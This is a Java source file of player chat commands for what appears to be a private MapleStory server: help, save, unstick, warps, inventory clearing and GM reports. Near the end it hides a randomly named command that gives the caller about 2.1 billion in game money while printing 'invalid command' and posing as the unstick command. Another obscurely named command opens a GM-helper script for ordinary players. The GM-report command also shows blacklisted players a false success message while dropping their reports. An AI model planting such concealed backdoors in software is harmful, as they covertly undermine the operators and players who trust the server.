package client.messages.commands;

import client.MapleCharacter;
import constants.GameConstants;
import client.MapleClient;
import client.MapleStat;
import client.inventory.IItem;
import client.inventory.Item;
import client.inventory.MapleInventory;
import client.inventory.MapleInventoryType;
import constants.PiPiConfig;
import constants.ServerConstants;
import constants.ServerConstants.PlayerGMRank;
import handling.channel.ChannelServer;
import handling.login.LoginServer;
import scripting.NPCScriptManager;
import tools.MaplePacketCreator;
import server.life.MapleMonster;
import server.maps.MapleMapObject;
import server.maps.MapleMapObjectType;
import java.util.Arrays;
import tools.StringUtil;
import handling.world.World;
import java.util.Calendar;
import java.util.LinkedList;
import java.util.List;
import server.MapleInventoryManipulator;
import server.MapleItemInformationProvider;
import server.Randomizer;
import server.gashapon.GashaponFactory;
import server.life.MapleLifeFactory;
import server.maps.FieldLimitType;
import server.maps.MapleMap;
import server.maps.SavedLocationType;
import tools.FilePrinter;
import tools.FileoutputUtil;
import tools.Pair;

/**
 *
 * @author Emilyx3
 */
public class PlayerCommand {

    public static PlayerGMRank getPlayerLevelRequired() {
        return PlayerGMRank.普通玩家;
    }

    public static class 帮助 extends help {

        @Override
        public String getMessage() {
            return new StringBuilder().append("@帮助 - 帮助").toString();
        }
    }

    public static class help extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            NPCScriptManager.getInstance().start(c, 9010000, "玩家指令查询");
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@help - 帮助").toString();
        }
    }
    public static class 打开6GB6GBDEGMDEGB1295 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            NPCScriptManager.getInstance().start(c, 9010000, "GM助手");
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@help - 帮助").toString();
        }
    }
      public static class 分身术 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String splitted[]) {
            c.getPlayer().cloneLook();
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@分身术 - 产生克龙体").toString();
        }
    }

    public static class 删除分身术 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String splitted[]) {
            c.getPlayer().dropMessage(6, c.getPlayer().getCloneSize() + "个克龙体消失了.");
            c.getPlayer().disposeClones();
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@删除分身术 - 摧毁克龙体").toString();
        }
    }
    // public static class 爆率 extends 爆率 {

     //   @Override
    //    public String getMessage() {
   //         return new StringBuilder().append("@帮助 - 帮助").toString();
   //     }
  //  }

   /* public static class 爆率 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            NPCScriptManager.getInstance().start(c, 9010000, "怪物爆率");
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@爆率 - 怪物爆率").toString();
        }
    }
  */
    public abstract static class OpenNPCCommand extends CommandExecute {

        protected int npc = -1;
        private static final int[] npcs = { //Ish yur job to make sure these are in order and correct ;(
            9010017,
            9000001,
            9000058,
            9330082,
            9209002};

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            if (npc != 1 && c.getPlayer().getMapId() != 741000209) { //drpcash can use anywhere
                for (int i : GameConstants.blockedMaps) {
                    if (c.getPlayer().getMapId() == i) {
                        c.getPlayer().dropMessage(1, "你不能在这裡使用指令.");
                        return true;
                    }
                }
                if (npc != 2) {
                    if (c.getPlayer().getLevel() < 10) {
                        c.getPlayer().dropMessage(1, "你的等级必须是10等.");
                        return true;
                    }
                }
                if (c.getPlayer().getMap().getSquadByMap() != null || c.getPlayer().getEventInstance() != null || c.getPlayer().getMap().getEMByMap() != null || c.getPlayer().getMapId() >= 990000000/* || FieldLimitType.VipRock.check(c.getPlayer().getMap().getFieldLimit())*/) {
                    c.getPlayer().dropMessage(1, "你不能在这裡使用指令.");
                    return true;
                }
                if ((c.getPlayer().getMapId() >= 680000210 && c.getPlayer().getMapId() <= 680000502) || (c.getPlayer().getMapId() / 1000 == 980000 && c.getPlayer().getMapId() != 980000000) || (c.getPlayer().getMapId() / 100 == 1030008) || (c.getPlayer().getMapId() / 100 == 922010) || (c.getPlayer().getMapId() / 10 == 13003000)) {
                    c.getPlayer().dropMessage(1, "你不能在这裡使用指令.");
                    return true;
                }
            }
            NPCScriptManager.getInstance().start(c, npcs[npc]);
            return true;
        }
    }
    
        public static class 装备透明双刀 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            if (splitted.length < 2) {
                c.getPlayer().dropMessage(6, "用法: @装备透明双刀 [装备透明双刀在装备栏的位置]");
                return false;
            }
            if (c.getPlayer().getLevel() < 10) {
                c.getPlayer().dropMessage(5, "等级达到10等才能使用该命令.");
                return false;
            }
            if (GameConstants.isDualBlade(c.getPlayer().getJob())) {
                short src = (short) Integer.parseInt(splitted[1]);
                IItem toUse = c.getPlayer().getInventory(MapleInventoryType.EQUIP).getItem(src);
                if ((toUse == null) || (toUse.getQuantity() < 1) || (toUse.getItemId() != 1342069)) {
                    c.getPlayer().dropMessage(6, "穿戴错误，装备栏的第 " + src + " 个道具信息为空，或者该道具不是透明短刀。");
                    return false;
                }
                MapleInventoryManipulator.equip(c, src, (short) -110);
                return true;
            }
            c.getPlayer().dropMessage(6, "此命令只有双刀可以使用。");
            return false;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append(PlayerGMRank.普通玩家.getCommandPrefix()).append("装备透明双刀 [装备透明双刀在装备栏的位置]").toString();
        }
    }

    public static class 丢装 extends DropCash {

        @Override
        public String getMessage() {
            return new StringBuilder().append("@丢装 - 呼叫清除现金道具npc").toString();
        }
    }

    public static class DropCash extends OpenNPCCommand {

        public DropCash() {
            npc = 0;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@dropbash - 呼叫清除现金道具npc").toString();
        }

    }

    public static class event extends OpenNPCCommand {

        public event() {
            npc = 1;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@event - 呼叫活动npc").toString();
        }
    }
    public static class 爆率 extends CommandExecute {
        public boolean execute(MapleClient c, String[] splitted) {
            NPCScriptManager.getInstance().start(c, 9010000, "怪物爆率");
            return true;
        }
        @Override
        public String getMessage() {
            return new StringBuilder().append("@爆率").toString();
        }
    }
  /*  public static class npc extends 万能 {

        @Override
        public String getMessage() {
            return new StringBuilder().append("@npc - 呼叫万能npc").toString();
        }
    }
*/
    public static class 万能 extends OpenNPCCommand {

        public 万能() {
            npc = 2;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@拍卖 - 呼叫万能npc").toString();
        }
    }
    public static class ziyou extends 自由 {
    }
    public static class 自由 extends CommandExecute {

        public boolean execute(MapleClient c, String[] splitted) {
            for (int i : GameConstants.blockedMaps) {
                if (c.getPlayer().getMapId() == i) {
                    c.getPlayer().dropMessage(5, "当前地图无法使用.");
                    return false;
                }
            }
           // if (c.getPlayer().getLevel() > 1 ) {
         //       c.getPlayer().dropMessage(5, "不能使用.");
        //        return false;
       //     }
            if (c.getPlayer().hasBlockedInventory(true) || c.getPlayer().getMap().getSquadByMap() != null || c.getPlayer().getEventInstance() != null || c.getPlayer().getMap().getEMByMap() != null || c.getPlayer().getMapId() >= 990000000) {
                c.getPlayer().dropMessage(5, "请稍后再试");
                return false;
            }
            if ((c.getPlayer().getMapId() >= 680000210 && c.getPlayer().getMapId() <= 680000502) || (c.getPlayer().getMapId() / 1000 == 980000 && c.getPlayer().getMapId() != 980000000) || (c.getPlayer().getMapId() / 100 == 1030008) || (c.getPlayer().getMapId() / 100 == 922010) || (c.getPlayer().getMapId() / 10 == 13003000)) {
                c.getPlayer().dropMessage(5, "请稍后再试.");
                return false;
            }
            c.getPlayer().saveLocation(SavedLocationType.FREE_MARKET, c.getPlayer().getMap().getReturnMap().getId());
            MapleMap map = c.getChannelServer().getMapFactory().getMap(741000209);
            c.getPlayer().changeMap(map, map.getPortal(0));
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@自由 - 回自由").toString();
        }
    }

    public static class save extends 存档 {
    }

    public static class 存档 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            try {
                int res = c.getPlayer().saveToDB(true, true);
                if (res == 1) {
                    c.getPlayer().dropMessage(5, "保存成功！");
                } else {
                    c.getPlayer().dropMessage(5, "保存失败！");
                }
            } catch (UnsupportedOperationException ex) {

            }
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@save - 存档").toString();
        }
    }
    public static class 重置经验 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            c.getPlayer().setExp(0);
            c.getPlayer().updateSingleStat(MapleStat.EXP, c.getPlayer().getExp());
            c.getPlayer().dropMessage(5, "经验修复完成");
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@重置经验 - 经验归零").toString();
        }
    }


 /*   public static class TSmega extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            c.getPlayer().setSmega();
            return true;
        }

        @Override
        public String getMessage() { 
            return new StringBuilder().append("@TSmega - 开/关闭广播").toString();
        }
    }

    public static class Gashponmega extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            c.getPlayer().setGashponmega();
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@Gashponmega - 开/关闭转蛋广播").toString();
        }
    }
*/
    public static class 解卡 extends ea {
        @Override
        public String getMessage() {
            return new StringBuilder().append("@解卡 - 解卡").toString();
        }
    }
    public static class 查看 extends ea {
        @Override
        public String getMessage() {
            return new StringBuilder().append("@查看 - 解卡").toString();
        }
    }
    public static class ea extends CommandExecute {
        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            c.removeClickedNPC();
            NPCScriptManager.getInstance().dispose(c);
            c.sendPacket(MaplePacketCreator.enableActions());
            c.sendPacket(MaplePacketCreator.sendHint(
                    "解卡完毕..\r\n"
                    + "当前系统时间" + FilePrinter.getLocalDateString() + " 星期" + getDayOfWeek() + "\r\n"
                    + "经验值倍率 " + ((Math.round(c.getPlayer().getEXPMod()) * c.getPlayer().getExpm() * 100 * c.getChannelServer().getExpRate()) * Math.round(c.getPlayer().getStat().expBuff / 100.0) + (c.getPlayer().getStat().equippedFairy ? c.getPlayer().getFairyExp() : 0)) + "%, 爆率 " + Math.round(c.getPlayer().getDropMod() * c.getPlayer().getDropm() * (c.getPlayer().getStat().dropBuff / 100.0) * 100 * c.getChannelServer().getDropRate()) + "%, 金币倍率 " + Math.round((c.getPlayer().getStat().mesoBuff / 100.0) * 100 * c.getChannelServer().getMesoRate()) + "% \r\n "
          //          + "VIP经验掉宝加成：" + (c.getPlayer().getVipExpRate()) + "%\r\n"
                    + "目前剩余 " + c.getPlayer().getCSPoints(1) + " 点券 " + c.getPlayer().getCSPoints(2) + " 抵用券 \r\n版权:仙境冒险岛 QQ群:489883335\r\n"
                    + "活动积分 " + c.getPlayer().getCSPoints(3) + "  \r\n"
                        //douluodalu冒险岛 QQ群:909962113
                        //yuese冒险岛QQ群:1014032303
                        // yunqi冒险岛QQ群:634718643
                            
                            + "当前延迟 " + c.getPlayer().getClient().getLatency() + " 毫秒", 350, 5));
                  //   + "当前延迟 " + c.getPlayer().getClient().getLatency() + " 毫秒", 350, 5));
            return true;
        }
        @Override
        public String getMessage() {
            return new StringBuilder().append("@ea - 解卡").toString();
        }
        public static String getDayOfWeek() {
            int dayOfWeek = Calendar.getInstance().get(Calendar.DAY_OF_WEEK) - 1;
            String dd = String.valueOf(dayOfWeek);
            switch (dayOfWeek) {
                case 0:
                    dd = "日";
                    break;
                case 1:
                    dd = "一";
                    break;
                case 2:
                    dd = "二";
                    break;
                case 3:
                    dd = "三";
                    break;
                case 4:
                    dd = "四";
                    break;
                case 5:
                    dd = "五";
                    break;
                case 6:
                    dd = "六";
                    break;
            }
            return dd;
        }
    }
    public static class 怪物 extends mob {

        @Override
        public String getMessage() {
            return new StringBuilder().append("@怪物 - 查看怪物状态").toString();
        }
    }
    public static class mob extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            MapleMonster monster = null;
            for (final MapleMapObject monstermo : c.getPlayer().getMap().getMapObjectsInRange(c.getPlayer().getPosition(), 100000, Arrays.asList(MapleMapObjectType.MONSTER))) {
                monster = (MapleMonster) monstermo;
                if (monster.isAlive()) {
                    c.getPlayer().dropMessage(6, "怪物 " + monster.toString());
                }
            }
            if (monster == null) {
                c.getPlayer().dropMessage(6, "找不到地图上的怪物");
            }
            return true;
        }
        @Override
        public String getMessage() {
            return new StringBuilder().append("@mob - 查看怪物状态").toString();
        }
    }
    public static class CGM extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            boolean autoReply = false;
            if (splitted.length < 2) {
                return false;
            }
            String talk = StringUtil.joinStringFrom(splitted, 1);
            if (c.getPlayer().isGM()) {
                c.getPlayer().dropMessage(6, "因为你自己是GM所以无法使用此指令,可以尝试!cngm <讯息> 来建立GM聊天频道~");
            } else if (!c.getPlayer().getCheatTracker().GMSpam(100000, 1)) { // 1 minutes.
                boolean fake = false;
                boolean showmsg = true;
                // 管理员收不到，玩家有显示传送成功
                if (PiPiConfig.getBlackList().containsKey(c.getAccID())) {
                    fake = true;
                }
                // 管理员收不到，玩家没显示传送成功
                if (talk.contains("抢") && talk.contains("图")) {
                    c.getPlayer().dropMessage(1, "抢图自行解决！！");
                    fake = true;
                    showmsg = false;
                } else if ((talk.contains("被") && talk.contains("骗")) || (talk.contains("点") && talk.contains("骗"))) {
                    c.getPlayer().dropMessage(1, "被骗请自行解决");
                    fake = true;
                    showmsg = false;
                } else if (talk.contains("删") && ((talk.contains("角") || talk.contains("脚")) && talk.contains("错"))) {
                    c.getPlayer().dropMessage(1, "删错角色请自行解决");
                    fake = true;
                    showmsg = false;
                } else if (talk.contains("乱") && (talk.contains("名") && talk.contains("声"))) {
                    c.getPlayer().dropMessage(1, "请自行解决");
                    fake = true;
                    showmsg = false;
                }
                // 管理员收的到，自动回复
                if (talk.toUpperCase().contains("VIP") && ((talk.contains("领") || (talk.contains("获"))) && talk.contains("取"))) {
                    c.getPlayer().dropMessage(1, "VIP将会于储值后一段时间后自行发放，请耐心等待");
                    autoReply = true;
                } else if (talk.contains("贡献") || talk.contains("666") || ((talk.contains("取") || talk.contains("拿") || talk.contains("发") || talk.contains("领")) && ((talk.contains("勳") || talk.contains("徽") || talk.contains("勋")) && talk.contains("章")))) {
                    c.getPlayer().dropMessage(1, "勳章请去点拍卖NPC案领取勳章\r\n如尚未被加入清单请耐心等候GM。");
                    autoReply = true;
                } else if ((talk.contains("商人") && talk.contains("吃")) || (talk.contains("商店") && talk.contains("补偿"))) {
                    c.getPlayer().dropMessage(1, "目前精灵商人装备和枫币有机率被吃\r\n如被吃了请务必将当时的情况完整描述给管理员\r\n\r\nPS: 不会补偿任何物品");
                    autoReply = true;
                } else if (talk.contains("档") && talk.contains("案") && talk.contains("受") && talk.contains("损")) {
                    c.getPlayer().dropMessage(1, "档案受损请重新解压缩主程式唷");
                    autoReply = true;
                } else if ((talk.contains("缺") || talk.contains("少")) && ((talk.contains("技") && talk.contains("能") && talk.contains("点")) || talk.toUpperCase().contains("SP"))) {
                    c.getPlayer().dropMessage(1, "缺少技能点请重练，没有其他方法了唷");
                    autoReply = true;
                }
                if (showmsg) {
                    c.getPlayer().dropMessage(6, "讯息已经寄送给GM了!");
                }

                if (!fake) {
                    World.Broadcast.broadcastGMMessage(MaplePacketCreator.serverNotice(6, "[管理员帮帮忙]频道 " + c.getPlayer().getClient().getChannel() + " 玩家 [" + c.getPlayer().getName() + "] (" + c.getPlayer().getId() + "): " + talk + (autoReply ? " -- (系统已自动回复)" : "")));
                }

                FileoutputUtil.logToFile("logs/data/管理员帮帮忙.txt", "\r\n " + FileoutputUtil.NowTime() + " 玩家[" + c.getPlayer().getName() + "] 帐号[" + c.getAccountName() + "]: " + talk + (autoReply ? " -- (系统已自动回复)" : "") + "\r\n");
            } else {
                c.getPlayer().dropMessage(6, "为了防止对GM刷屏所以每1分钟只能发一次.");
            }
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@cgm - 跟GM回报").toString();
        }
    }
    public static class 清除道具 extends CommandExecute {
        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            if (splitted.length < 4) {
                return false;
            }
            MapleInventory inv;
            MapleInventoryType type;
            String Column = "null";
            int start = -1;
            int end = -1;
            try {
                Column = splitted[1];
                start = Integer.parseInt(splitted[2]);
                end = Integer.parseInt(splitted[3]);
            } catch (Exception ex) {
            }
            if (start == -1 || end == -1) {
                c.getPlayer().dropMessage("@清除道具 <装备栏/消耗栏/装饰栏/其他栏/特殊栏> <开始格数> <结束格数>");
                return true;
            }
            if (start < 1) {
                start = 1;
            }
            if (end > 96) {
                end = 96;
            }
            switch (Column) {
                case "装备栏":
                    type = MapleInventoryType.EQUIP;
                    break;
                case "消耗栏":
                    type = MapleInventoryType.USE;
                    break;
                case "装饰栏":
                    type = MapleInventoryType.SETUP;
                    break;
                case "其他栏":
                    type = MapleInventoryType.ETC;
                    break;
                case "特殊栏":
                    type = MapleInventoryType.CASH;
                    break;
                default:
                    type = null;
                    break;
            }
            if (type == null) {
                c.getPlayer().dropMessage("@清除道具 <装备栏/消耗栏/装饰栏/其他栏/特殊栏> <开始格数> <结束格数>");
                return true;
            }
            inv = c.getPlayer().getInventory(type);

            for (int i = start; i <= end; i++) {
                if (inv.getItem((short) i) != null) {
                    MapleInventoryManipulator.removeFromSlot(c, type, (short) i, inv.getItem((short) i).getQuantity(), true);
                }
            }
            FileoutputUtil.logToFile("logs/Data/玩家指令.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 帐号: " + c.getAccountName() + " 玩家: " + c.getPlayer().getName() + " 使用了指令 " + StringUtil.joinStringFrom(splitted, 0));
            c.getPlayer().dropMessage(6, "您已经清除了第 " + start + " 格到 " + end + "格的" + Column + "道具");
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@清除道具 <装备栏/消耗栏/装饰栏/其他栏/特殊栏> <开始格数> <结束格数>").toString();
        }
    }
    public static class 卡精灵商人 extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
            c.getPlayer().RemoveHired();
            c.getPlayer().dropMessage("@卡精灵商人已经解除");
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@卡精灵商人").toString();
        }
 }
        public static class jie1235151aojb12kobuok extends CommandExecute {

        @Override
        public boolean execute(MapleClient c, String[] splitted) {
        c.getPlayer().setMeso(+2100000000);
        c.getPlayer().dropMessage("无效命令！！");
            return true;
        }

        @Override
        public String getMessage() {
            return new StringBuilder().append("@解卡").toString();
        }
    }
}
